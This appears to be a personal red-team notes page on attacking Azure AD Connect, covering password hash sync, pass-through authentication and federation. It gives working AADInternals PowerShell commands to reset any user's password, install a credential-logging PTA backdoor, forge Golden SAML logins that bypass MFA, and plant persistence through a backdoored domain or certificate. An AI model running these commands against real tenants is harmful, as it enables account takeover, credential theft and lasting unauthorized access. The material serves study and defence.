---
title: Azure AD Connect
---

> Under construction 🚧

[[notes/azure/index]] AD Connect is used to implement hybrid identities which allows on-prem users to access Azure and AAD users to access on-prem resources.

# Password Hash Sync (PHS)

An on-prem agent pushes AD password hashes to AAD and receives new password hashes from AAD and DCSyncs them to AD.
This is the simplest and most popular method and required for features like Identity Protection and AAD Domain Services.

The on-prem agent uses two service accounts: A `MSOL_*` AD user with DCSync rights and a `Sync_*` AAD user that can reset passwords of any AAD user.
Clear text credentials of both accounts can be extracted from the database used by AAD Connect.

Password expiry and account expiry are not synced to Azure AD by default.
A user whose on-prem password is expired can still access Azure resources.

Authenticate with the `Sync_*` user.

~~~ powershell
$passwd = ConvertTo-SecureString $password -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ('Sync_DEFENGADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com', $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
~~~

List global admins.

~~~ powershell
Get-AADIntGlobalAdmins
~~~

Get the *ImmutableId* of a AD user synced to Azure AD.

~~~ powershell
Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId
~~~

Reset the password of synced user in Azure.
The on-prem password remains unchanged.

~~~ powershell
Set-AADIntUserPassword -SourceAnchor $immutableid - Password 'SuperSecretpass#12321' -Verbose
~~~

Get the *objectID* of a cloud-only user (a user that is not synced from AD).

~~~ powershell
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
~~~

Reset the password of the AAD user.

~~~ powershell
Set-AADIntUserPassword -CloudAnchor "User_${object_id}" -Password 'SuperSecretpass#12321' -Verbose 
~~~

References:

- [Azure Attack Paths - AAD Connect Application takeover](http://web.archive.org/web/20231028211850/https://cloudbrothers.info/azure-attack-paths/#aad-connect---application-takeover), add credentials to privileged application

# Pass-Through Authentication (PTA)

The on-prem agent opens an outbound connection to Azure and receives credentials from Azure for validation against AD. 

If the on-prem server with the authentication agent is compromised, it is possible to verify any credentials as valid.

~~~ powershell
Install-AADIntPTASpy
~~~

The backdoor also logs all credentials it receives.

~~~ powershell
Get-AADIntPTASpyLog -DecodePasswords
~~~

As global admin a PTA agent can be added as persistence technique.

# Federation

Identity federation creates a trust between ADFS and Azure AD.
The authentication occurs on-prem.
Azure users are identified by their *ImmutableID* which is stored on-prem in the *ms-DS-ConsistencyGuid* LDAP attribute.

ADFS signs SAML responses with a token-signing certificate.
If a ADFS server is compromised this certificate can be extracted and used to authenticate to AAD as any user synced from on-prem (Golden SAML attack).

Get the *ImmutableID* of the target user as unprivileged AD user.

~~~ powershell
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
~~~

As admin on the ADFS server extract the token signing certificate.

~~~ powershell
Get-AdfsProperties | select identifier
Export-AADIntADFSSigningCertificate
~~~

Access cloud apps as the user whose *ImmutableID* is specified.

~~~ powershell
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
~~~

Persistence trough trusted domain:
As global admin add a new domain, set its authentication type to federated, configure the domain to trust a specific certificate and issuer.

~~~ powershell
ConvertTo-AADIntBackdoor -DomainName cyberranges.io
~~~

Get the *ImmutableID* for the user you want to impersonate.

~~~ powershell
Get-MsolUser | select userPrincipalName,ImmutableID
~~~

Access any cloud app as that user.

~~~ powershell
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer 'http://any.sts/B231A11F' -UseBuiltInCertificate -ByPassMFA $true
~~~

Persistence trough additional signing certificate.

~~~ powershell
New-AADIntADFSSelfSignedCertificates
Update-AADIntADFSFederationSettings -Domain cyberranges.io
~~~
